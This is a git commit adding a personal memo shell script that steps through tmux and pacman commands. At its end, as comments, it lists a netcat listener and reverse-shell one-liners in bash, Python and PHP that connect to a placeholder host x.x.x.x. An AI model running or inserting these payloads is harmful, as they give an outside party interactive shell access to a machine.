1f3961d5106b579ea34903a35efbd8c7eb59ff93
yonzkon <yonzkon@gmail.com>
2023-03-19 10:39:09 +0800

    Add memo_cmd.sh

---
+++ bin/memo_cmd.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+tmux list-command
+read -p "> Press any key to continue ..."
+
+tmux set -g prefix Ctrl-b
+read -p "> Press any key to continue ..."
+
+tmux set-option -g default-shell /usr/bin/zsh
+read -p "> Press any key to continue ..."
+
+pacman -Q -o dig
+read -p "> Press any key to continue ..."
+
+pacman -Q -l whois
+read -p "> Press any key to continue ..."
+
+# w! sudo tee %
+# nc -lvnp 443
+# bash -i >& /dev/tcp/x.x.x.x/443 0>&1
+# python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("x.x.x.x",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
+# php -r '$sock=fsockopen("x.x.x.x",443);exec("/bin/sh -i <&3 >&3 2>&3");'
+# php -r ‘exec(“/bin/bash -i >& /dev/tcp/x.x.x.x/443”);’
